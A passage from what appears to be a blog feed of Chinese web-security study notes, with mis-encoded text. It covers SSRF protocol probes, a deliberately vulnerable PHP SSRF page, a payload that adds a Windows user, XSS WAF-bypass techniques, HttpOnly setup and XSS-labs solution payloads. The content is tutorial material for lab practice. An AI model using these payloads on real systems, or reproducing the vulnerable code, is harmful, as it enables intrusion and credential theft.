class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http,file,dict,ftp,gopher ç­‰</span><br><span class="line">æ¼æ´æ”»å‡»ï¼šç«¯å£æ‰«æï¼ŒæŒ‡çº¹è¯†åˆ«ï¼Œæ¼æ´åˆ©ç”¨ï¼Œå†…ç½‘æ¢é’ˆç­‰</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.64.144/phpmyadmin/</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://192.168.64.144:3306/info</span><br><span class="line">ftp://192.168.64.144:21</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118240.png" alt="image-20210912115508618"></p><p>è¿™é‡Œæ¼”ç¤ºçš„æ˜¯fileåè®®ï¼Œé€šè¿‡è¯¥åè®®å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹</p><h4 id="ä¸åŒç±»å‹ç½‘ç«™æ”¯æŒåè®®"><a href="#ä¸åŒç±»å‹ç½‘ç«™æ”¯æŒåè®®" class="headerlink" title="ä¸åŒç±»å‹ç½‘ç«™æ”¯æŒåè®®"></a>ä¸åŒç±»å‹ç½‘ç«™æ”¯æŒåè®®</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211118259.png" alt="image-20210912120631161"></p><h4 id="SSRFæ¼æ´ä»£ç æµ‹è¯•"><a href="#SSRFæ¼æ´ä»£ç æµ‹è¯•" class="headerlink" title="SSRFæ¼æ´ä»£ç æµ‹è¯•"></a>SSRFæ¼æ´ä»£ç æµ‹è¯•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">è¯·è¾“å…¥å›¾ç‰‡åœ°å€ï¼š&lt;input type=&#x27;text&#x27; name=&#x27;url&#x27;&gt;</span><br><span class="line">&lt;input type=&#x27;submit&#x27; value=&quot;æäº¤&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$img =</span><br><span class="line">file_get_contents(&#x27;http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20t</span><br><span class="line">est1234%201234%20/add.&#125;&#x27;);</span><br><span class="line">echo $url;</span><br><span class="line">echo $img;</span><br><span class="line">//header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);</span><br><span class="line">//echo $img;</span><br><span class="line">//$file=fopen(&#x27;x.png&#x27;,&#x27;w+&#x27;);</span><br><span class="line">//fwrite($file,$img);</span><br><span class="line">//fclose($file);</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$_POST[&#x27;url&#x27;];</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_POST[&#x27;url&#x27;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1bp96ECJ</span><br><span class="line">https://www.t00ls.net/articles-41070.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> CSRF </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>28WEBæ¼æ´-XSSè·¨ç«™ä¹‹WAFç»•è¿‡åŠå®‰å…¨ä¿®å¤</title>
      <link href="/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/"/>
      <url>/2021/09/21/28WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8BWAF%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å¸¸è§„-WAF-ç»•è¿‡æ€è·¯"><a href="#å¸¸è§„-WAF-ç»•è¿‡æ€è·¯" class="headerlink" title="å¸¸è§„ WAF ç»•è¿‡æ€è·¯"></a>å¸¸è§„ WAF ç»•è¿‡æ€è·¯</h3><ul><li><p>æ ‡ç­¾è¯­æ³•æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ aæ ‡ç­¾ã€imgæ ‡ç­¾æ¥æ›¿æ¢script</span><br></pre></td></tr></table></figure></li><li><p>ç‰¹æ®Šç¬¦å·å¹²æ‰°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#@!%&amp;/ç­‰ç­‰,ç‰¹æ®Šç¬¦å·è¿›è¡Œå¹²æ‰°</span><br></pre></td></tr></table></figure></li><li><p>æäº¤æ–¹å¼æ›´æ”¹ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡POSTã€GETæ–¹å¼è¿›è¡Œç»•è¿‡æäº¤</span><br></pre></td></tr></table></figure></li><li><p>åƒåœ¾æ•°æ®æº¢å‡º </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨&lt;script&gt;alert(1)asjkhdsajkhdjakh&lt;/script&gt;åƒè¿™æ ·å°±æ˜¯åƒåœ¾æ•°æ®</span><br></pre></td></tr></table></figure></li><li><p>åŠ å¯†è§£å¯†ç®—æ³• </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡å°†XSSè¯­å¥åŠ å¯†ç»•è¿‡</span><br></pre></td></tr></table></figure></li><li><p>ç»“åˆå…¶ä»–æ¼æ´ç»•è¿‡</p></li></ul><h3 id="XSStrikeå·¥å…·"><a href="#XSStrikeå·¥å…·" class="headerlink" title="XSStrikeå·¥å…·"></a>XSStrikeå·¥å…·</h3><h4 id="XSStrike-ä¸»è¦ç‰¹ç‚¹"><a href="#XSStrike-ä¸»è¦ç‰¹ç‚¹" class="headerlink" title="XSStrike ä¸»è¦ç‰¹ç‚¹"></a>XSStrike ä¸»è¦ç‰¹ç‚¹</h4><ul><li>åå°„å’Œ DOM XSS æ‰«æ </li><li>å¤šçº¿ç¨‹çˆ¬è™«</li><li>Contextåˆ†æ </li><li>å¯é…ç½®çš„æ ¸å¿ƒ </li><li>æ£€æµ‹å’Œè§„é¿WAF </li><li>è€æ—§çš„ JS åº“æ‰«æ </li><li>æ™ºèƒ½ payload ç”Ÿæˆå™¨ </li><li>æ‰‹å·¥åˆ¶ä½œçš„ HTML &amp; JavaScriptè§£æå™¨ </li><li>å¼ºå¤§çš„ fuzzingå¼•æ“ </li><li>ç›²æ‰“ XSS æ”¯æŒ</li><li>é«˜æ•ˆçš„å·¥ä½œæµ </li><li>å®Œæ•´çš„ HTTPæ”¯æŒ</li><li>Bruteforce payloads æ”¯æŒ</li><li>Payload ç¼–ç </li></ul><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</span><br><span class="line">-u, --url //æŒ‡å®šç›®æ ‡ URL</span><br><span class="line">--data //POST æ–¹å¼æäº¤å†…å®¹</span><br><span class="line">-v, --verbose //è¯¦ç»†è¾“å‡º</span><br><span class="line">-f, --file //åŠ è½½è‡ªå®šä¹‰ paload å­—å…¸</span><br><span class="line">-t, --threads //å®šä¹‰çº¿ç¨‹æ•°</span><br><span class="line">-l, --level //çˆ¬è¡Œæ·±åº¦</span><br><span class="line">-t, --encode //å®šä¹‰ payload ç¼–ç æ–¹å¼</span><br><span class="line">--json //å°† POST æ•°æ®è§†ä¸º JSON</span><br><span class="line">--path //æµ‹è¯• URL è·¯å¾„ç»„ä»¶</span><br><span class="line">--seeds //ä»æ–‡ä»¶ä¸­æµ‹è¯•ã€æŠ“å– URL</span><br><span class="line">--fuzzer //æµ‹è¯•è¿‡æ»¤å™¨å’Œ Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ã€‚</span><br><span class="line">--update //æ›´æ–°</span><br><span class="line">--timeout //è®¾ç½®è¶…æ—¶æ—¶é—´</span><br><span class="line">--params //æŒ‡å®šå‚æ•°</span><br><span class="line">--crawl //çˆ¬è¡Œ</span><br><span class="line">--proxy //ä½¿ç”¨ä»£ç†</span><br><span class="line">--blind //ç›²æµ‹è¯•</span><br><span class="line">--skip //è·³è¿‡ç¡®è®¤æç¤º</span><br><span class="line">--skip-dom //è·³è¿‡ DOM æ‰«æ</span><br><span class="line">--headers //æä¾› HTTP æ ‡å¤´</span><br><span class="line">-d, --delay //è®¾ç½®å»¶è¿Ÿ</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨ä¿®å¤æ–¹æ¡ˆ"><a href="#å®‰å…¨ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="å®‰å…¨ä¿®å¤æ–¹æ¡ˆ"></a>å®‰å…¨ä¿®å¤æ–¹æ¡ˆ</h3><ul><li>å¼€å¯ httponly,è¾“å…¥è¿‡æ»¤ï¼Œè¾“å‡ºè¿‡æ»¤ç­‰ </li><li>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a> </li><li>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></li></ul><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><ul><li><a href="https://gitee.com/yhtmxl/imxss/">https://gitee.com/yhtmxl/imxss/</a> </li><li><a href="https://github.com/3xp10it/xwaf">https://github.com/3xp10it/xwaf</a> </li><li><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a> </li><li><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a> </li><li><a href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a> </li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> XSSè·¨ç«™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27WEBæ¼æ´-XSSè·¨ç«™ä¹‹ä»£ç åŠhttponlyç»•è¿‡</title>
      <link href="/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/27WEB%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%8F%8Ahttponly%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="HTTPOnly"><a href="#HTTPOnly" class="headerlink" title="HTTPOnly"></a>HTTPOnly</h3><h4 id="ä»€ä¹ˆæ˜¯HTTPOnlyï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯HTTPOnlyï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯HTTPOnlyï¼Ÿ"></a>ä»€ä¹ˆæ˜¯HTTPOnlyï¼Ÿ</h4><p>å¦‚æœæ‚¨åœ¨cookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»(æ”»å‡»æ‰‹æ³•)ï¼Œå…·ä½“ä¸€ç‚¹çš„ä»‹ç»è¯·googleè¿›è¡Œæœç´¢</p><h4 id="å¼€å¯HTTPOnly"><a href="#å¼€å¯HTTPOnly" class="headerlink" title="å¼€å¯HTTPOnly"></a>å¼€å¯HTTPOnly</h4><p>è¿™é‡Œåªä»‹ç»PHPå¦‚ä½•å¼€å¯ã€‚</p><p>PHP5.2ä»¥ä¸Šç‰ˆæœ¬å·²æ”¯æŒHttpOnlyå‚æ•°çš„è®¾ç½®ï¼ŒåŒæ ·ä¹Ÿæ”¯æŒå…¨å±€çš„HttpOnlyçš„è®¾ç½®ï¼Œåœ¨php.iniä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly =</span><br></pre></td></tr></table></figure><p>è®¾ç½®å…¶å€¼ä¸º1æˆ–è€…TRUEï¼Œæ¥å¼€å¯å…¨å±€çš„Cookieçš„HttpOnlyå±æ€§ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒåœ¨ä»£ç ä¸­æ¥å¼€å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br><span class="line">// or session_set_cookie_params(0, NULL, NULL, NULL, TRUE); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Cookieæ“ä½œå‡½æ•°setcookieå‡½æ•°å’Œsetrawcookieå‡½æ•°ä¹Ÿä¸“é—¨æ·»åŠ äº†ç¬¬7ä¸ªå‚æ•°æ¥åšä¸ºHttpOnlyçš„é€‰é¡¹ï¼Œå¼€å¯æ–¹æ³•ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure><p>å¯¹äºPHP5.1ä»¥å‰ç‰ˆæœ¬ä»¥åŠPHP4ç‰ˆæœ¬çš„è¯ï¼Œåˆ™éœ€è¦é€šè¿‡headerå‡½æ•°æ¥å˜é€šä¸‹äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Set-Cookie: hidden=value; httpOnly&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h4 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h4><p>é˜²æ­¢XSSè¯»å–cookieä¿¡æ¯</p><h4 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h4><p>å°†ä»£ç å†™å…¥æ–‡ä»¶ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;session.cookie_httponly&quot;, 1); </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117200.png" alt="image-20210908203702609"></p><p>å½“æˆ‘ä»¬æ˜¯ç”¨XSSè¯­å¥è¿›è¡Œç›—å–Cookieæ—¶ï¼Œè¿™é‡Œç›´æ¥å°†XSSä»£ç å†™åˆ°ä»£ç ä¸­ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117894.png" alt="image-20210908203857028"></p><p>ç„¶åå»æŸ¥çœ‹XSSå¹³å°ï¼Œå¯ä»¥çœ‹åˆ°Cookieæ²¡æœ‰è¢«è¿”å›</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117074.png" alt="image-20210908203952045"></p><h4 id="ç»•è¿‡HttpOnly"><a href="#ç»•è¿‡HttpOnly" class="headerlink" title="ç»•è¿‡HttpOnly"></a>ç»•è¿‡HttpOnly</h4><p>å¼€å¯HttpOnlyåªä¼šé˜²æ­¢æˆ‘ä»¬è¯»å–Cookieï¼Œè€Œä¸ä¼šä½¿æˆ‘ä»¬XSSè¯­å¥å¤±æ•ˆã€‚å¦‚æœå¯¹æ–¹å¼€å¯äº†HttpOnlyã€‚é™¤äº†å¯ä»¥é€šè¿‡è·å–Cookieæ¥è¿›è¡Œç™»å½•ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡è´¦å·å’Œå¯†ç è¿›è¡Œç™»å½•ã€‚</p><p><strong>ä¿å­˜è¯»å–</strong></p><p>å¦‚æœå¯¹æ–¹åœ¨è¿›è¡Œè´¦å·å¯†ç ç™»å½•åï¼Œè¿›è¡Œäº†æµè§ˆå™¨ä¿å­˜ã€‚æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨XSSè¿›è¡Œæµè§ˆå™¨è´¦å·å¯†ç è¯»å–ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117574.png" alt="image-20210908204924604" style="zoom:67%;" /><p><strong>æœªä¿å­˜è¯»å–</strong></p><p>å¦‚æœå¯¹æ–¹åœ¨è¿›è¡Œè´¦å·å¯†ç ç™»å½•åï¼Œæ²¡æœ‰è¿›è¡Œæµè§ˆå™¨ä¿å­˜ã€‚æˆ‘ä»¬å¯ä»¥é‡‡ç”¨è¡¨å•åŠ«æŒçš„æ–¹å¼ï¼Œå°†å¯¹æ–¹è¾“å…¥çš„è´¦å·å¯†ç ï¼Œå‘é€ä¸€ä»½ç»™æˆ‘ä»¬ã€‚è¿™ä¸ªæ”»å‡»æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œç™»å½•é¡µé¢å¿…é¡»è¦æœ‰XSSæ¼æ´ã€‚</p><h3 id="XSS-labs"><a href="#XSS-labs" class="headerlink" title="XSS-labs"></a>XSS-labs</h3><h4 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level1.php?name=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h4><p>æŸ¥çœ‹ä»£ç å‘ç°ã€‚</p><h5 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h5><p><strong>PHP htmlspecialchars() å‡½æ•°</strong></p><p>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºï¼‰å’Œ â€œ&gt;â€ ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br></pre></td></tr></table></figure><h5 id="æ˜¾ç¤ºç»“æœ"><a href="#æ˜¾ç¤ºç»“æœ" class="headerlink" title="æ˜¾ç¤ºç»“æœ"></a>æ˜¾ç¤ºç»“æœ</h5><p>å°†&lt;&gt;æ›¿æ¢æˆäº†<code>&amp;lt;</code>ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=&quot;center&quot;&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alet(1)&amp;lt;script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117116.png" alt="image-20210908211617873" style="zoom:67%;" /><p>æˆ‘ä»¬å‘ç°ä¸‹é¢ä¸€ä¸ªæ ‡ç­¾ä¸­è¿˜æœ‰ä¸€ä¸ªæˆ‘ä»¬å†™çš„jsè¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‰é¢å†™ä¸Šâ€&gt;é—­åˆå‰é¢çš„ï¼Œå°±å¯ä»¥æ‰§è¡ŒXSSä»£ç äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss-labs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h4><p>é™¤äº†&lt;&gt;è¢«è¿‡æ»¤æ‰ä»¥åï¼Œâ€ä¹Ÿè¢«è¿‡æ»¤æ‰äº†ã€‚æˆ‘ä»¬åœ¨è¾“å…¥å’Œç¬¬äºŒå…³ä¸€æ ·çš„ä»£ç æ—¶ï¼ŒåŒå¼•å·è¢«ä»£ç å®ä¾‹åŒ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š</p><ul><li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;</li><li>â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º â€œ</li><li>â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º â€˜</li><li>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;</li><li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;</li></ul><h5 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h5><p><strong>HTML onclick äº‹ä»¶å±æ€§</strong></p><p>å½“ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œä¸€æ®µ JavaScriptï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;copyText()&quot;&gt;Copy Text&lt;/button&gt;</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=&#x27;javascript:alert(/xss/)                  #onfocusèšç„¦äº‹ä»¶</span><br><span class="line">&#x27; onfocus=&#x27;alert(/xss/) </span><br></pre></td></tr></table></figure><h4 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h4><p>å’Œç¬¬3å…³ä¸€æ ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h4><p>å°†onè¿‡æ»¤äº†ï¼Œè¿‡æ»¤æˆo_näº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&quot; o_nfocus=&quot;javascript:alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h5><p>å°†XSSä»£ç å†™æˆè¶…é“¾æ¥å½¢å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h4><p>å°†hrefè¿‡æ»¤äº†ï¼Œå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=&quot;javascript:alert(/xss/)&quot;&gt;click me &lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h4><p>JavaScriptçš„scriptæ›¿æ¢ä¸ºç©ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åŒå†™ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><h4 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h4><p>JavaScriptçš„scriptè¿‡æ»¤äº†ï¼Œå¤§å°å†™æ²¡ç»•è¿‡ï¼Œæ‰€ä»¥è€ƒè™‘ç¼–ç ç»•è¿‡</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211117966.png" alt="image-20210908214650837" 